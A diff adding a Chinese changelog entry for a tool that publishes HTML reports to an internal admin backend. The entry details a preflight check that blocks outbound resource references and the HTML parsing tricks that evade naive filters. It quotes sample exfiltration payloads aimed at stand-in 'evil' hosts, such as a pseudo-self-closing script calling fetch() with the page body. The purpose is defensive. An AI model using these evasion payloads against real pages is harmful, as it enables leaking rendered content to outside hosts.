@@ -9,6 +9,132 @@ NBDpsy 内容创作 skills（`nbdpsy-content` 插件）的版本变更记录。
 
 ---
 
+## [1.41.0] — 2026-07-26
+
+### 新增：战略规划报告一键搬运（`tools/publish_strategy_report.py`）
+
+管理后台「战略规划」模块（`/strategy`）本次开了 API Key 入口，运营出完的 HTML 报告不必再手工贴进后台。
+新脚本按 slug 幂等 upsert：
+
+```
+python3 tools/publish_strategy_report.py --html 报告-artifact版.html \
+    --slug ops-diagnosis-202607 --title "运营数据诊断报告（2026-07）" \
+    --generated-at 2026-07-26T12:17:00+08:00 [--version-label v1-首发] [--update] [--dry-run]
+```
+
+`--update` **必须同时给 `--version-label`**，否则客户端直接拒绝、一个字节都不发：后端 upsert 是
+`ON CONFLICT DO UPDATE SET version_label = EXCLUDED.version_label`，漏传会把库里已有的标签静默清成
+`NULL`（前端 3 处退化成显示 slug，批注导出抬头也从「报告版本：v1-首发」变成 slug），而脚本只会回显
+`null` 不告警。后端行为不动，闸门放在客户端。
+
+它落在 `tools/` 而不是任何一个内容 skill——这是运维工具，不是内容生产工具。
+
+**写前拒绝**：脚本**总是**带 `expect`（无 `--update` → `new`，有 `--update` → `revision`），
+与实际不符时服务端返 409 且**不写库**，所以不存在「覆盖已经发生、回不去」这回事；
+脚本把两个方向分别说清（slug 已存在 → 建议 `--update` 或换 slug；slug 不存在 → slug 大概写错了，
+新建应去掉 `--update`）。若 200 却返回与 `expect` 相反的 `created`，视为契约破裂而非成功，非零退出。
+
+**发请求前的本地预检**（任一不过直接退出，一个字节都不发）：
+- **不是完整 HTML 文档**——同一产出目录里常同时躺着 `报告-artifact版.html`（片段）与 `报告.html`（完整文档），
+  同名前缀、字节数只差两百多，`--html` 指错是高概率事故。`<head>` 按**带闭合尖括号**精确匹配
+  （片段里有合法的 `<header>`，前缀匹配会误伤），且**不拿 `<title>` 当判据**（两个版本各有一个，区分不了）。
+- **无外部资源引用**。理由不是「外链加载不了会缺图」，而是反过来——外链会真的加载，等于给一份在
+  管理后台里渲染的文档开了一条出站通道。判据**不是属性名枚举**（枚举漏 `srcset` / `imagesrcset` /
+  `<object data>` / `<video poster>` / `<form action>` / `<base href>` / `<meta http-equiv=refresh>` /
+  `<script>fetch()`，后者能把报告正文直接外带），而是**按位置划线**：只扫「浏览器会拿去取资源的位置」——
+  **每个标签的属性值**与 **`<style>` / `<script>` 块的内容**，其中任何 `https?://` 或协议相对 `//`
+  开头的 URL 命中即拒。相应地，这些位置之外一律放行：
+  - **标签之间的文本节点**：`<p>数据来源：https://…</p>`、`<pre><code>curl https://…</code></pre>`。
+    「参考资料 / 数据来源」章节把网址当正文列出来是运营报告最常见的写法（LLM 出稿尤其爱写），
+    渲染时不发任何请求，拦它是纯误杀。
+  - **`<a href>` 超链接**（唯一被跳过的属性）：点击才导航，且后台那个 iframe 是
+    `sandbox="allow-scripts"`，没有 `allow-popups` / `allow-top-navigation`，点了也出不去。
+    `<a>` 上的其它属性（`ping`、`style="…url(…)"`）照旧参与判定。
+  - **HTML 注释**：`<!-- 生成自 https://… -->` 不渲染。
+  - **命名空间 URI 白名单**：`.../2000/svg`、`.../1999/xlink`（Illustrator 与多数图表库导出的老式 SVG 带它）、
+    `.../1999/xhtml`（`<foreignObject>`）。白名单按**整串精确匹配**（或其后紧跟 `#` 片段），不是前缀匹配——
+    前缀匹配会被 `http://www.w3.org/2000/svg.evil.com/x.png` 这类同前缀域名当成出站通道。
+  - 页内锚点 `#s1`、相对路径 `/x`、`data:` URI（含以 `//` 开头的 JPEG base64）继续放行。
+
+  **分词交给标准库 `html.parser.HTMLParser`，不用正则近似**。用 `<[^>]+>` 这类正则切标签，
+  在三处必然出错，其中两处是 fail-open（静默放行出站外链）：
+  1. **引号属性值里的 `>` 会让正则断句**——`<img alt="收入>成本" src="https://cdn.evil.com/x.png">`
+     在第一个 `>` 处被切断，`src` 连同标签后半截掉进「标签之间」完全不被扫描；而浏览器按 HTML5 分词
+     把引号内的 `>` 当普通字符，整条 `img` 正常解析并**真的去取图**。运营数据报告里
+     `alt="留存 > 60%"`、`title="收入>成本"` 是完全正常的写法，踩中它不需要恶意。
+  2. **注释终止符不止 `-->`**——浏览器在 comment-end-bang 状态遇 `--!>` 即结束注释，
+     `<!-- 说明 --!><img src="https://…">` 里的 `img` 正常渲染并发起请求；而 `<!--.*?-->`
+     会从第一个 `<!--` 一路吃到最后一个 `-->`，把整条 `img` 吞掉。
+  3. **正文里的裸 `<` 会制造假阳**——`<p>转化率 < 5%，数据来源：https://…</p>` 里的 `<` 让后面的
+     正文被当成「标签内部」，一个纯文本网址被误杀。比较符在运营数据报告里很常见，LLM 出稿也常不转义成 `&lt;`。
+
+  `HTMLParser` 一次解决前三条：属性由它解析成键值对（引号里的 `>` 天然不断句），
+  裸 `<` 被当文本。**顺带闭掉 HTML 字符引用绕过**——`<img src="&#104;ttps://evil.com/x.png">`
+  浏览器解码后照样发请求，而解析器交出的属性值已是解码后的真值，判据直接跑在真值上。
+  它对畸形 HTML 的容错与浏览器不完全一致，但输入是我们自己生成的报告，且严格比正则更接近浏览器；
+  **解析抛异常一律 fail-closed**（当作预检不过，绝不因为「解析器炸了」就放行）。
+
+  **但有两处必须自己补齐，不能全指望 stdlib**——都由真实 Chromium（按后台的
+  `iframe sandbox="allow-scripts"` + `srcdoc` 渲染、route 拦截统计实发请求）逐条复现确认：
+
+  - **`<script/>` / `<style/>` 伪自闭写法**（覆写 `handle_startendtag`）。HTML5 规定
+    **HTML 元素上的自闭合标志被忽略**，浏览器照常让 script/style 进 raw-text 一路吃到
+    `</script>` / `</style>` 并执行整块内容；`HTMLParser` 相反——见到 `/>` 走
+    `handle_startendtag`（默认实现＝`handle_starttag` + `handle_endtag`），raw-text 标志
+    刚置上就被同一次调用清掉、解析器自身也没进 raw-text，于是
+    `<script/>fetch("https://evil/leak?d="+document.body.innerHTML)</script>` 整块 JS
+    以普通文本（甚至被当成 HTML 注释）漂过去而**完全不被扫描**——浏览器实发请求，闸门判空。
+    修法：对 `style` / `script` 的 `/>` 当作**普通开始标签**处理（属性照常收集，并显式
+    `set_cdata_mode` 让解析器真正进 raw-text），收尾交给结束标签；其余元素的 `/>`
+    维持自闭合语义。`<script />`（带空格）、`<SCRIPT/>`（大小写）、`<style media="all"/>`（带属性）、
+    块内含 JS 注释或裸 `<` 的变体一并覆盖。
+  - **`--!>` 的判据不许挂在解释器补丁级别上**（`_normalize_for_scan`）。`HTMLParser` 认不认
+    `--!>` 取决于装机环境：打过 HTML5 对齐补丁的构建是 `commentclose = r'--!?>'`（认），
+    历史 stdlib 是 `r'--\s*>'`（**不认**，上面第 2 条的缺陷原样复活）。`install.sh` 声明支持
+    Python 3.9+，运营在自己机器上装完洞就悄悄回来、工具还一声不吭。故**扫描前把 `--!>`
+    归一成 `-->`**——只改扫描用的副本，上传的 `content_html` 仍是原始字节。归一化是安全的：
+    注释之外这两个记号都只是普通字符，换的是一种等价的注释终止符，既不新开注释也不改变 URL 匹配。
+    回归用例把 `html.parser.commentclose` 分别按住成历史版与对齐版，**两档都必须命中**，
+    因而不依赖本机 stdlib 的实际行为。
+
+  与之同源的一条纪律：`CDATA_ELEMENTS` 是 `HTMLParser.CDATA_CONTENT_ELEMENTS` 的
+  **故意收窄的自有副本**，只取 `style` / `script`。不直接引用 stdlib 常量，是因为它随版本漂移
+  （3.12 已扩到 6 个，含 `xmp` / `iframe` / `noembed` / `noframes`），判据跟着 Python 版本变
+  意味着同一份报告在不同机器上结论不同。只取这两个则是按「浏览器会不会拿这段文本去取资源」划的线：
+  `<iframe>` 出站靠的是 `src` **属性**（属性值本就逐条扫），`xmp` / `noembed` / `noframes`
+  的文本只当纯文本渲染——实测浏览器零请求、闸门也放行，两边一致。
+  往这个元组里加元素时**必须同步处理 `handle_startendtag` 的状态**，否则就是又一条静默出站通道。
+
+  **两处刻意保留的误杀**（方向都是 fail-closed，且报错直接指到位置，作者删掉即可）：
+  - `<style>` / `<script>` 块是**整段内容**参与扫描，因此块内**注释里**的网址
+    （`// 算法见 https://…`、`/* 配色参考 https://… */`）**会被拦**。不做注释剥离，是因为要剥离就得在正则里
+    近似 JS/CSS 分词，而 `url(https://…)` 里的 `//`、字符串字面量里的 `//` 都会把朴素的行注释规则带沟里——
+    这正是上面三条的成因。
+  - **`<svg>` 里嵌的 `<script/>`** 会被拦，尽管浏览器实测零请求——自闭合标志在**外来元素**
+    （foreign content）上按 HTML5 是**生效**的，script 真的自闭了。要精确区分就得自己维护
+    svg / math 元素栈，判错方向就是 fail-open，不值当。
+    （注意同位置的 `<svg><style/>…` 实测**照样出站**，那是真缺陷、不是误杀。）
+
+  **报错文案指到命中位置**（`<img src> → https://…`、`<style> 块内容 → https://…`），
+  并说清「正文文本 / HTML 注释 / `<a href>` 里的网址不必处理」，免得作者拿着一句「含外部资源引用」
+  满篇找 `<img>` 只能靠猜。
+- **不检查主题**。报告是双主题文档，靠后台 srcdoc 前置注入 `data-theme="light"` 稳定渲染；
+  静态 grep 判不了「实际渲染成什么色」，加了只会误杀合格产物。
+
+**输出纪律**：**除命令行用法错误（argparse，exit=2）外，每条路径都往 stdout 打一行 JSON 且必带
+`outcome`**（`created` / `updated` / `conflict` / `failed` / `dry-run`），字段为
+`slug`/`id`/`created`/`version_label`/`bytes`（失败再加 `reason`）。文件不存在、为空、非 UTF-8、
+**权限不足读不了**都走 `preflight_failed` 这一条，不抛裸 traceback——否则 stdout 一个字都没有，
+调用方无从解析。stderr 只给人看。`--dry-run` 只打字段摘要，不打正文全文，且**全程不使用密钥**
+（运营等管理员发密钥期间就该能本地自查 `--html` 有没有指错）；任何日志、报错、异常里都不出现密钥或
+其片段，请求失败只回显状态码与服务端 `error` 文案。`--generated-at` 设为**必填**——省了的话页头
+「生成于」显示的是推送时间而不是出数时间，同一份内容重发时间还会漂。
+
+**新增可选凭据 `NBDPSY_STRATEGY_API_KEY`**（scopes 需含 `strategy:write`）：`doctor` 多报一项
+`strategy_ready`，未配置只在 notes 里提示、**不判整体失败**。不复用 `NBDPSY_BLOG_API_KEY`——
+写入目标是内部管理后台里被渲染的内容，与写公开站内容不是同一信任级别，单开一把才能独立吊销
+而不牵连发文流水线；也**不进 `REQUIRED_KEYS`**，否则所有只写内容的人 doctor 都会无谓变红。
+
 ## [1.40.0] — 2026-07-27
 
 ### 推介笔记：发布标题三要素 + 内页密度提升
